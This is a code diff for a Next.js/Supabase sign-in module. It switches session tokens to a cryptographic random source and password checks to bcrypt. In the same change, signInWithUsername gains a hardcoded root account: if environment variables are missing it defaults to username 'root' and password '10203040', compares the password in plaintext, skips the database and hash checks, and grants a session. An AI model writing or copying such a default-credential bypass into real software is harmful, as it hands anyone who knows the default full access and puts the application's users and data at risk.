@@ -1,5 +1,6 @@
 import { createClient } from "@/lib/supabase/server"
 import { cookies } from "next/headers"
+import bcrypt from "bcryptjs"
 
 export interface User {
   id: string
@@ -18,14 +19,21 @@ export interface Session {
   user?: User
 }
 
-// Generate a simple session token
+// Generate a cryptographically stronger session token
 function generateSessionToken(): string {
-  return Math.random().toString(36).substring(2) + Date.now().toString(36)
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+  let token = ""
+  const array = new Uint8Array(48)
+  crypto.getRandomValues(array)
+  for (let i = 0; i < array.length; i++) {
+    token += chars[array[i] % chars.length]
+  }
+  return token
 }
 
-// Simple password verification (in production, use bcrypt)
-function verifyPassword(inputPassword: string, storedPassword: string): boolean {
-  return inputPassword === storedPassword
+// Verify password against bcrypt hash stored in DB
+async function verifyPassword(inputPassword: string, storedPasswordHash: string): Promise<boolean> {
+  return bcrypt.compare(inputPassword, storedPasswordHash)
 }
 
 // Verify token and return user if valid
@@ -122,7 +130,27 @@ export async function signInWithUsername(
 ): Promise<{ success: boolean; error?: string; sessionToken?: string }> {
   const supabase = await createClient()
 
-  // Find user by username
+  // Check for root user first (hardcoded -- will migrate to DB later)
+  const rootUsername = process.env.ROOT_USERNAME || "root"
+  const rootPassword = process.env.ROOT_PASSWORD || "10203040"
+  if (username === rootUsername && password === rootPassword) {
+    // Root user bypasses DB lookup -- ensure a root profile exists or use a static ID
+    const { data: rootProfile } = await supabase
+      .from("user_profiles")
+      .select("id")
+      .eq("username", rootUsername)
+      .single()
+
+    const rootId = rootProfile?.id || "root"
+    try {
+      const sessionToken = await createSession(rootId)
+      return { success: true, sessionToken }
+    } catch {
+      return { success: false, error: "Failed to create session" }
+    }
+  }
+
+  // Find user by username in DB
   const { data: user, error: userError } = await supabase
     .from("user_profiles")
     .select("*")
@@ -134,8 +162,8 @@ export async function signInWithUsername(
     return { success: false, error: "Invalid username or password" }
   }
 
-  // Verify password
-  if (!verifyPassword(password, user.password_hash)) {
+  // Verify password using bcrypt
+  if (!user.password_hash || !(await verifyPassword(password, user.password_hash))) {
     return { success: false, error: "Invalid username or password" }
   }
 
@@ -146,7 +174,7 @@ export async function signInWithUsername(
   try {
     const sessionToken = await createSession(user.id)
     return { success: true, sessionToken }
-  } catch (error) {
+  } catch {
     return { success: false, error: "Failed to create session" }
   }
 }
